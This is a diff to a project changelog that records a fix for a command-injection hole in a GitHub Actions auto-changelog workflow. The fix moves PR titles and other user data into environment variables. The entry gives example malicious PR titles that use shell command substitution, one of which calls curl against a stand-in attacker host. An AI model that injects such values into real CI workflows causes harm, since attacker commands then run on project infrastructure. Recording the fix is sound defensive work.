@@ -25,6 +25,16 @@
 
 ## [UNRELEASED]
 
+### Security
+- **Code Injection Vulnerability**: Fixed potential code injection in auto-update-changelog workflow
+  - Fixed vulnerability in `.github/workflows/auto-update-changelog.yml`
+  - User-controlled data (PR titles, descriptions) were directly interpolated in shell commands
+  - Moved all user-controlled data to environment variables (PR_TITLE, PR_NUMBER, CHANGE_TYPE, PR_USER)
+  - Prevents command injection via malicious PR titles like `"Feature $(whoami)"` or `"Update \`curl evil.com\``
+  - Fixed in Summary step (lines 246-263) and Commit step (lines 200-224)
+  - Security best practice: Always use environment variables for user-controlled data in shell contexts
+  - Impact: High-severity vulnerability eliminated without functional changes
+
 ### Fixed - Critical Build and CI Issues
 - **Setuptools Package Discovery**: Fixed "multiple top-level packages" error
   - Added proper [build-system] configuration to `pyproject.toml`
